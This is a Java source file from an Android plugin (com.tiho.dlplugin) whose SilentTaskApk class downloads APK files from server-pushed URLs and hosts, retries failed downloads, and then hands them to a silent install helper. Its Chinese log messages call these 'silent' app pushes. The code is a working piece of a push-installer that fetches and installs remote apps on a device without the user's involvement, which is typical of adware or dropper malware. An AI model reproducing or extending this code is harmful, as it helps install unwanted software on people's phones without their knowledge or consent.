package com.tiho.dlplugin.task.silent.SilentTask;

import java.io.File;
import java.io.IOException;

import android.content.Context;
import android.util.Pair;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushSilentBean;
import com.tiho.dlplugin.bean.PushSilentConfig;
import com.tiho.dlplugin.bean.Resource;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.dao.PushConfigDAO;
import com.tiho.dlplugin.observer.download.DownloadStat;
import com.tiho.dlplugin.task.silent.SilentInstallHelper;
import com.tiho.dlplugin.task.silent.SilentList;
import com.tiho.dlplugin.util.FileUtil;
import com.tiho.dlplugin.util.StringUtils;

public class SilentTaskApk extends SilentTask {

	public SilentTaskApk(Context context, SilentList list) {
		super(context, list);
	}

	@Override
	public void silentPush(Resource resource) {
		if (resource instanceof Resource) {
			PushSilentBean msg = (PushSilentBean) resource;
			download(msg);
		}
	}

	private Pair<String, String[]> extraHost(Context context) {
		PushConfigDAO dao = DAOFactory.getConfigDAO(context);
		PushSilentConfig config = dao.getConfigByKey(PushConfigDAO.TYPE_SILENT, PushSilentConfig.class);

		String ips = config.getDownIp();
		String[] ipList = StringUtils.isEmpty(ips) ? new String[0] : ips.split(",");

		return Pair.create(config.getDownHost(), ipList);

	}

	private void download(PushSilentBean msg) {
		try {

			DownloadStat stat = fromSilentBean(msg);
			LogManager.LogShow("静默应用开始下载 push pack" + msg.getPack());
			fileDownloader.startDownload(context, stat, extraHost(context));

			int fail = 0;
			boolean result = false;

			while (!(result = stat.isComplete()) && (++fail) < 3) {
				LogManager.LogShow("下载失败" + fail + ",重试"+stat.getUri());
				fileDownloader.startDownload(context, stat, extraHost(context));
			}

			if (result) {

				setIsFirstDownload(false);

				LogManager.LogShow(stat.getFinalFile().getAbsolutePath() + "静默应用下载完成");

				if (!stat.getFinalFile().exists())
					stat.renameToFinalName();

				//下载完成后后记录当前时间
				FileUtil.saveDownloadInfo(context, stat.getFinalFile().getAbsolutePath(), stat.getPackageName());
				SilentInstallHelper.getInstance(context).gotoInstall(msg);
			}

		} catch (Exception e) {
			LogManager.LogShow("下载时出错", e);
		}finally{
			list.consumed(msg);
		}
	}

	private DownloadStat fromSilentBean(PushSilentBean ps) {
		DownloadStat stat = new DownloadStat(true);
		stat.setPushId(0);
		stat.setPackageName(ps.getPack());
		stat.setVerCode(ps.getVer());
		stat.setUri(ps.getPath());

		stat.setTotal(ps.getSize());
		stat.setCurrent(0);
		stat.setMd5(ps.getMd5());
		stat.setSilent(true);

		stat.setFinalFile(ps.getApkFile(context));

		File tmp = ps.getApkTmpFile(context);

		stat.setTmpFile(tmp);

		if (!tmp.exists())
			try {
				tmp.createNewFile();
			} catch (IOException e) {
				e.printStackTrace();
			}

		if (tmp.exists()) {
			stat.setCurrent(tmp.length());

			// 如果当前offset大于总长度，把offset设成0，重新开始下载
			if (stat.getCurrent() > stat.getTotal())
				stat.setCurrent(0);
		}

		return stat;
	}

}
